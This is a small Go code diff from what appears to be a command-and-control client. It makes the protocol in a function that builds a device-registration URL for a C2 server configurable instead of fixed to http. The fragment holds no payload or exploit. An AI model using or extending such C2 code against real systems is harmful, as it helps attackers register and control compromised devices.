@@ -32,7 +32,7 @@ func Get_ip() net.IP {
 */
 func GetURLForC2Server(C2 string) string {
 	C2_host := C2
-	url := "http://" + C2_host + ":8000/api/devices/addDevice"
+	url := config.Config.C2Protocol+"://" + C2_host + ":8000/api/devices/addDevice"
 	return url
 }
 
